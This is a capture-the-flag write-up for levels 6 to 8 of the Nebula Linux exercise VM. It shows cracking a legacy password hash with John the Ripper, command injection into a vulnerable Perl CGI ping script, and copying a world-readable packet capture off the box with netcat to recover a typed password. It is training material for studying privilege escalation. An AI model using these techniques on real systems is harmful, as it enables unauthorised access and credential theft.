---
title: "Writeup: Nebula (level 6 - level 8)"
date: 2020-12-19T16:05:18+08:00
draft: false
---

Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at [Exploit Exercises](https://exploit-exercises.lains.space/).

<br>

## Level 6

The description of Level 6 is provided as follows.

```
The flag06 account credentials came from a legacy unix system.

To do this level, log in as the level06 account with the password level06. 
Files for this level can be found in /home/flag06.
```

If you are not familiar with the password file (/etc/passwd) and shadow file (/etc/shadow) in the Unix-based system, you can check this [post](https://chuang76.github.io/posts/users_and_groups/) I wrote before. In this challenge, we are going to use the password file to get the flag. 

Let's check the contents of /etc/passwd first. The second field is about password information, i.e., encrypted password. In the modern system, the second field is typically stored as `x`, which means the actual content is maintained in another file called /etc/shadow.

![](https://github.com/chuang76/image/blob/master/06-1.PNG?raw=true)

However, this is a legacy Unix system, the password is not "hidden" in the shadow file. So we can use [John The Ripper](https://zh.wikipedia.org/wiki/John_The_Ripper), a free crafting passwords tool to decode the password. 

```
$ cat passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh

$ john passwd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (flag06)
1g 0:00:00:00 100% 2/3 20.00g/s 15060p/s 15060c/s 15060C/s 123456..marley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now, we have the decoded password, i.e., "hello". Let's use it to log in as account flag06 and get the flag. 

![](https://github.com/chuang76/image/blob/master/06-2.PNG?raw=true)

<br>

## Level 7

Here is the description of Level 7.

```
The flag07 user was writing their very first perl program that allowed them to 
ping hosts to see if they were reachable from the web server.

To do this level, log in as the level07 account with the password level07. 
Files for this level can be found in /home/flag07.
```

The contents in /home/flag07 can be displayed as follows. 

![](https://github.com/chuang76/image/blob/master/07-1.PNG?raw=true)

Let's view the contents of the file index.cgi. It is a CGI script written in Perl. [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) (Common Gateway Interface) is a specification for web servers to execute programs like command-line running on a server that generates dynamic web pages. As you can see, we need to provide the parameter Host to index.cgi. Then, the ping result will be displayed on the screen. We can check that if index.cgi works successfully or not.

![](https://github.com/chuang76/image/blob/master/07-3.PNG?raw=true)

```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

Subsequently, let's view the contents of the file thttpd.conf. [Thttpd](https://en.wikipedia.org/wiki/Thttpd) is a simple web server, and thttpd.conf is its configure file. Here is the part of thttpd.conf. As you can see, thttpd is listening to the port 7007, running with our target account fla07, and it supports the CGI program, index.cgi. 

```
port=7007
dir=/home/flag07
user=flag07
cgipat=**.cgi
```

So, we can use wget command to retrieve the response. For example, we can get the result of whoami. Note that the semicolon (;) character should be encoded as "%3B" in URL. 

![](https://github.com/chuang76/image/blob/master/07-4.PNG?raw=true)

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/07-5.PNG?raw=true)

<br>

## Level 8

The description of Level 8 is provided as follows. 

```
World readable files strike again. Check what that user was up to, 
and use it to log into flag08 account.

To do this level, log in as the level08 account with the password level08. 
Files for this level can be found in /home/flag08.
```

Here is the contents of the directory /home/flag08. [Tcpdump](https://en.wikipedia.org/wiki/Tcpdump) is a free tool that allows uses to capture packets. As you can see, capture.pcap is a tcpdump capture file. It is a file that contains packet information. 

![](https://github.com/chuang76/image/blob/master/08-1.PNG?raw=true)

The file capture.pcap is not human-readable if we try to view its contents with cat command. Instead, we should use tcpdump -r to view the contents.  

![](https://github.com/chuang76/image/blob/master/08-2.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/08-3.PNG?raw=true)

Next, we are going to analyze these packet information. We can use [Wireshark](https://en.wikipedia.org/wiki/Wireshark), a powerful packet analyzer, to analyze the file. However, since we don't have the permission to install the tool, we are not able to use Wireshark on Nebula. So let's transfer the captured file to our personal machine (e.g. in my case is Kali Linux), then analyze the file on our personal machine.  

If you are not familiar that how to make two virtual machines communication, you can check this [video](https://www.youtube.com/watch?v=vReAkOq-59I). After setting up the network, we can use [netcat](https://en.wikipedia.org/wiki/Netcat) (nc) command to transfer the file as follows. That is, the machine is running nc in listening mode on port 9527.

```
$ nc -l -p 9527 > capture.pcap
```

Subsequently, run the following command to make Nebula send the file to our personal machine. The IP address may be different depends on different machine and setting, you can check the related information via ifconfig command. The IP address of my personal machine is 192.168.100.6. 

```
$ nc 192.168.100.6 9527 < /home/flag08/capture.pcap
```

Open Wireshark on Kali Linux. 

![](https://github.com/chuang76/image/blob/master/08-4.PNG?raw=true)

Follow TCP stream, as you can see, it shows Password: backdoor...00Rm8.ate. However, the dot symbol does not represent the "dot" literally. It means some characters that are non-printable on Wireshark. 

![](https://github.com/chuang76/image/blob/master/08-5.PNG?raw=true)

Let's move on. We need to figure out what is the actual password. We can start at the No. 43 packet, which contains the character Password:. 

![](https://github.com/chuang76/image/blob/master/08-8.PNG?raw=true)

Then, we can focus on what character is transfer from 59.233.235.218 (the user who types the password) to 59.233.235.223. In the Windows system, the key Enter is represented as carriage return (CR, 0x0d) and line feed (LF, 0x0a). The characters that ends at 0x0d and 0x0a can be collected as follows. 

```
'b', 'a', 'c', 'k', 'd', 'o', 'o', 'r', 0x7f, 0x7f, 0x7f, '0', '0', 'R', 'm', '8', 0x7f, 'a', 't', 'e'
```

After checking the ASCII table, we can know that 0x7f means delete. Hence, the actual password is back00Rmate. 

```
backdoor
     ^^^      delete 
back00Rm8
        ^     delete
back00Rmate 
```

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/08-7.PNG?raw=true)

